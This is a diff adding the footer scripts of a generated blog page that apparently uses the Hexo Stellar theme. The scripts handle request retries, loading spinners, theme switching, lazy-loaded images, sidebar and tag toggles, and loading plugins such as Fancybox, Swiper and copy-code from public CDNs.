+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        if ($(el).find('.loading-wrap').length == 0){
+          $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+        }
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `Switched to Light Mode`,
+      dark: `Switched to Dark Mode`,
+      auto: `Switched to Auto Mode`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"},"rss":{"js":"/js/services/rss.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.chat-file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
